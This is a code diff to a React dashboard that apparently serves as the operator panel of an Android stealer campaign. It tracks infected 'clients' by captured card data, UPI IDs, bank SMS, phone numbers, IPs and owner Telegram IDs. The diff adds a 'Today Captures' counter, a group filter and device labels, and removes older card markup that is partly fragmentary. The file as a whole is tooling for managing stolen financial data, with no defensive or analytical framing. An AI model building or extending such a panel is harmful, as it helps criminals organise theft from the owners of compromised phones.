@@ -24,6 +24,7 @@ import {
   IndianRupee,
   Signal,
   Copy,
+  Zap,
 } from "lucide-react";
 import { Layout } from "@/components/layout";
 
@@ -46,6 +47,7 @@ export function Dashboard() {
   const [sortMode, setSortMode] = useState<
     "newest" | "oldest" | "name" | "battery"
   >("newest");
+  const [groupFilter, setGroupFilter] = useState("all");
 
   useEffect(() => {
     const clientsRef = ref(db, "clients");
@@ -131,11 +133,17 @@ export function Dashboard() {
             d.phone.toLowerCase().includes(q) ||
             d.model.toLowerCase().includes(q) ||
             d.upi.toLowerCase().includes(q) ||
+            (d.deviceName || "").toLowerCase().includes(q) ||
+            (d.group || "").toLowerCase().includes(q) ||
             d.id.toLowerCase().includes(q) ||
             (d.ip_address || "").includes(q)
           );
         })
       : visibleDevices;
+
+    if (groupFilter !== "all") {
+      base = base.filter((d) => d.group === groupFilter);
+    }
 
     switch (filter) {
       case "online":
@@ -200,6 +208,18 @@ export function Dashboard() {
     const offline = visibleDevices.filter((d) => !d.isOnline).length;
     const cards = visibleDevices.filter(hasCards).length;
     const upi = visibleDevices.filter((d) => d.upi).length;
+    const groups = [
+      ...new Set(visibleDevices.map((d) => d.group).filter(Boolean)),
+    ] as string[];
+    const today = visibleDevices.filter((d) => {
+      const cc =
+        Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
+      const upi =
+        Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
+      const ts = Math.max(cc, upi);
+      if (!ts) return false;
+      return new Date(ts).toDateString() === new Date().toDateString();
+    }).length;
     return {
       total: visibleDevices.length,
       online,
@@ -207,6 +227,8 @@ export function Dashboard() {
       cards,
       upi,
       bank: bankSmsCount,
+      groups,
+      today,
     };
   }, [visibleDevices, bankSmsCount]);
 
@@ -259,6 +281,14 @@ export function Dashboard() {
       key: "upi" as const,
       accent: "from-primary/15 to-primary/5 text-primary",
       glow: "shadow-primary/20",
+    },
+    {
+      label: "Today Captures",
+      value: fleet.today,
+      icon: Zap,
+      key: "all" as const,
+      accent: "from-warning/25 to-warning/5 text-warning",
+      glow: "shadow-warning/30",
     },
   ];
 
@@ -425,6 +455,20 @@ export function Dashboard() {
             </button>
           ))}
         </div>
+        {fleet.groups.length > 0 && (
+          <select
+            value={groupFilter}
+            onChange={(e) => setGroupFilter(e.target.value)}
+            className="h-9 px-3 rounded-xl border border-card-border bg-card/70 backdrop-blur text-xs font-semibold text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
+          >
+            <option value="all">All Groups</option>
+            {fleet.groups.map((g) => (
+              <option key={g} value={g}>
+                {g}
+              </option>
+            ))}
+          </select>
+        )}
         <select
           value={sortMode}
           onChange={(e) => setSortMode(e.target.value as any)}
@@ -504,9 +548,20 @@ export function Dashboard() {
                       {isPinned ? "📌" : String(i + 1).padStart(2, "0")}
                     </td>
                     <td className="px-4 py-3">
-                      <span className="font-display font-semibold">
-                        {device.model}
+                      <span className="font-display font-semibold flex items-center gap-1.5">
+                        {device.deviceName || device.model}
+                        {device.colorTag && (
+                          <span
+                            className="inline-block w-2 h-2 rounded-full"
+                            style={{ background: device.colorTag }}
+                          />
+                        )}
                       </span>
+                      {device.deviceName && (
+                        <span className="block text-[10px] text-muted-foreground font-mono">
+                          {device.model}
+                        </span>
+                      )}
                     </td>
                     <td className="px-4 py-3">
                       <span className="flex items-center gap-1.5 min-w-0 group/phone">
@@ -665,7 +720,13 @@ export function Dashboard() {
                       className="font-display font-semibold text-sm truncate max-w-[10rem] group-hover:text-primary transition-colors"
                       title={device.model}
                     >
-                      {device.model}
+                      {device.deviceName || device.model}
+                      {device.colorTag && (
+                        <span
+                          className="inline-block w-2 h-2 rounded-full ml-1.5 align-middle"
+                          style={{ background: device.colorTag }}
+                        />
+                      )}
                     </h3>
                     <p
                       className="font-mono text-[10px] text-muted-foreground truncate max-w-[10rem] mt-0.5"
@@ -727,26 +788,6 @@ export function Dashboard() {
                       )}
                     </button>
 
-                  <div className="flex items-center gap-1">
-                    <button
-                      onClick={(e) => togglePin(device.id, e)}
-                      title={isPinned ? 'Unpin' : 'Pin to top'}
-                      className={`p-2 rounded-full transition-all ${
-                        isPinned
-                          ? 'bg-[#7c3aed]/10 text-[#7c3aed] opacity-100'
-                          : 'opacity-0 group-hover:opacity-100 text-[#6b5b7d] hover:text-[#7c3aed] hover:bg-[#f5efff]'
-                      }`}
-                    >
-                      {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
-                    </button>
-
-                    <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold ${
-                      device.isOnline
-                        ? 'bg-[#10b981]/10 text-[#10b981]'
-                        : 'bg-[#9ca3af]/20 text-[#6b5b7d]'
-                    }`}>
-                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
-                      {device.isOnline ? 'Online' : 'Offline'}
                     <span
                       className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold tracking-wide ${
                         online
@@ -804,99 +845,6 @@ export function Dashboard() {
                   </div>
                 </div>
 
-                <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    {device.battery && (
-                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
-                        {batteryNum <= 20 ? (
-                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
-                    <div className="grid grid-cols-2 gap-y-4 gap-x-2 text-sm mt-auto">
-                      <div className="flex flex-col">
-                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Phone</span>
-                        <span className="font-medium text-xs text-foreground mt-0.5">{device.phone || 'N/A'}</span>
-                      </div>
-                      <div className="flex flex-col">
-                        {device.upi ? (
-                          <>
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
-                            <span className="font-medium text-xs text-[#a78bfa] truncate mt-0.5">{device.upi}</span>
-                          </>
-                        ) : device.androidV ? (
-                          <>
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Android</span>
-                            <span className="font-medium text-xs text-foreground mt-0.5">v{device.androidV}</span>
-                          </>
-                        ) : (
-                          <>
-                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
-                            <span className="font-medium text-xs text-muted-foreground/50 mt-0.5">N/A</span>
-                          </>
-                        )}
-                      </div>
-                    </div>
-                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold tracking-wide ${
-                      online
-                        ? 'bg-success/10 text-success border border-success/20 shadow-[0_0_12px_-2px] shadow-success/40'
-                        : 'bg-muted/60 text-muted-foreground border border-card-border'
-                    }`}>
-                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
-                      {device.isOnline ? 'Online' : 'Offline'}
-                    </span>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-2 gap-y-3 gap-x-2 text-sm mt-auto">
-                  <div className="flex flex-col">
-                    <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Phone</span>
-                    <span className="font-medium text-xs text-[#2d1b4e]">{device.phone || 'N/A'}</span>
-                  </div>
-                  {device.vehicleNumber && (
-                    <div className="flex flex-col col-span-2">
-                      <span className="text-[10px] text-amber-600 dark:text-amber-400 uppercase tracking-wider font-medium">Vehicle</span>
-                      <span className="font-mono font-semibold text-xs text-amber-700 dark:text-amber-300 truncate">{device.vehicleNumber}</span>
-                    </div>
-                  )}
-                  <div className="flex flex-col">
-                    {device.upi ? (
-                      <>
-                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
-                        <span className="font-medium text-xs text-[#7c3aed] truncate">{device.upi}</span>
-                      </>
-                    ) : device.androidV ? (
-                      <>
-                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Android</span>
-                        <span className="font-medium text-xs text-[#2d1b4e]">v{device.androidV}</span>
-                      </>
-                    ) : (
-                      <>
-                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
-                        <span className="font-medium text-xs text-[#9ca3af]">N/A</span>
-                      </>
-                    )}
-                  </div>
-                </div>
-
-                <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    {device.battery && (
-                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
-                        {batteryNum <= 20 ? (
-                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
-                        ) : (
-                          <Battery className="w-3.5 h-3.5" />
-                        )}
-                        <span className={batteryNum <= 20 ? 'text-[#f59e0b]' : ''}>{device.battery}</span>
-                      </div>
-                    )}
-                    {device.ip_address && (
-                      <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0] flex items-center gap-1">
-                        <Wifi className="w-2.5 h-2.5" />
-                        {device.ip_address.split('.').slice(0,2).join('.')}…
-                      </span>
-                    )}
-                    {device.ownerTelegramId && isAdmin && (
-                      <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0]">
-                        {device.ownerTelegramId.slice(0, 8)}…
                 {/* Spec chips */}
                 <div className="relative mt-3.5 flex items-center gap-1.5 flex-wrap">
                   {device.androidV && (
